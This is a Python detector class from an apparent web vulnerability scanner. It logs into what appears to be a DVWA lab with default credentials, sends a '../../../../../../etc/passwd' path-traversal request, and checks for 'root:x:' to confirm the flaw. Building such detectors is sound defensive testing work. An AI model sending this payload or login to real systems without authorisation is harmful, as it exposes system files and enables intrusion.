from __future__ import annotations

import re

import httpx

from app.scanners.base import (
    BaseDetector,
    DetectorResult,
    ScanContext,
)


class PathTraversalDetector(BaseDetector):

    detector_id = "path_traversal"
    name = "Path Traversal Detector"
    vulnerability_type = "Path Traversal"
    supported_targets = ["web"]

    async def check(
        self,
        context: ScanContext,
    ) -> DetectorResult:

        try:
            async with httpx.AsyncClient(
                timeout=context.timeout_seconds,
                follow_redirects=True,
                headers=context.extra.get("headers", {}),
            ) as client:

                login_page = await client.get(
                    f"{context.base_url}/login.php"
                )

                token_match = re.search(
                    r"name='user_token' value='([^']+)'",
                    login_page.text,
                )

                if not token_match:
                    return DetectorResult(
                        detector=self.detector_id,
                        vulnerability="Path Traversal",
                        detected=False,
                        validation_status="ERROR",
                        severity="HIGH",
                        confidence="LOW",
                        evidence={
                            "reason": "Unable to extract login token.",
                        },
                        remediation="Validate file paths.",
                        cwe="CWE-22",
                        owasp_category="A01:2021 - Broken Access Control",
                    )

                token = token_match.group(1)

                await client.post(
                    f"{context.base_url}/login.php",
                    data={
                        "username": "admin",
                        "password": "password",
                        "Login": "Login",
                        "user_token": token,
                    },
                )

                response = await client.get(
                    
                        f"{context.base_url}"
                        "/vulnerabilities/fi/"
                        "?page=../../../../../../etc/passwd"
                    
                )

                if "root:x:" in response.text:

                    return DetectorResult(
                        detector=self.detector_id,
                        vulnerability="Path Traversal",
                        detected=True,
                        validation_status="CONFIRMED",
                        severity="HIGH",
                        confidence="HIGH",
                        endpoint=str(response.url),
                        evidence={
                            "indicator": "root:x:",
                        },
                        remediation=(
                            "Validate and sanitize file paths."
                        ),
                        cwe="CWE-22",
                        owasp_category=(
                            "A01:2021 - Broken Access Control"
                        ),
                        cvss_score=8.5,
                    )

        except Exception as exc:

            return DetectorResult(
                detector=self.detector_id,
                vulnerability="Path Traversal",
                detected=False,
                validation_status="ERROR",
                severity="HIGH",
                confidence="LOW",
                evidence={
                    "error": str(exc),
                },
                remediation="Validate file paths.",
                cwe="CWE-22",
                owasp_category="A01:2021 - Broken Access Control",
            )

        return DetectorResult(
            detector=self.detector_id,
            vulnerability="Path Traversal",
            detected=False,
            validation_status="NOT_DETECTED",
            severity="HIGH",
            confidence="LOW",
            evidence={
                "reason": "Path traversal was not detected.",
            },
            remediation="Validate file paths.",
            cwe="CWE-22",
            owasp_category="A01:2021 - Broken Access Control",
        )